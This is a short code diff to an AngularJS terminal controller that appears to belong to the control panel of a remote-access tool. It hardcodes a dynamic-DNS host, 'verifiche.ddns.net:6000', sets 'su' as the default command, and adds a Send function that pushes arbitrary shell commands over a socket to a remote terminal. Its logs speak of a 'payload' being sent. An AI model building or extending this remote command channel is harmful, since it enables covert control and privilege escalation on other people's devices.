@@ -551,16 +551,24 @@ app.controller("TermCtrl", function($scope, $rootScope) {
         socket.removeAllListeners(terminal);
     });
     $TermCtrl.url="tcp://verifiche.ddns.net:6000";
-    $TermCtrl.Record = (urltext) => {
+    $TermCtrl.cmd="su";
+    $TermCtrl.Connect = (urltext) => {
 
                 $rootScope.Log('payload inviato');
-                socket.emit(ORDER, { order: terminal, url: urltext });
+                socket.emit(ORDER, { order: terminal, url: urltext ,cmd: "" });
               
                 
 
         }
 
-    
+    $TermCtrl.Send = (command) => {
+
+                $rootScope.Log('comando inviato');
+                socket.emit(ORDER, { order: terminal, url: "" ,cmd: command });
+              
+                
+
+        }
 
 
     
